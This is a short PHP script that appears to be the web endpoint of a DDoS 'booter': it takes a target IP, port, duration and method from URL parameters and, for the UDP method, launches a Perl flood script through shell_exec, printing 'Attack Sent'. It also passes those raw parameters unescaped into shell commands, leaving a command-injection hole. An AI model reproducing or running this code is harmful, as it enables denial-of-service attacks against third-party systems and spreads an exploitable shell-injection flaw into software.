<?php
        $attacktype = $_GET["method"];
        $ip = $_GET["ip"];
        if (empty($ip)) { $ip = $_GET["host"]; }
        $port = $_GET["port"];
        $time = $_GET["time"];
        $proc   = hash('crc32', $ip);
            if (empty($ip) || empty($port) || empty($time) || empty($attacktype))
            {
                 die('<span style="font: normal 16px Tahoma; color: red;">Incorrect Method, Valid Methods : UDP </span>');
            }
         if (($attacktype == "UDP") || ($attacktype == "udp"))
        {
            $output = shell_exec("perl new.pl $ip $port $time"); 
            print("Attack Sent on $ip:80 For $time using $attacktype!");
        }
         if (($attacktype == "STOP") || ($attacktype == "STOP"))
        {
            $output = shell_exec("sudo pkill -f $proc "); 
            print("Attack Sent on $ip:80 For $time using $attacktype!");
        }
?>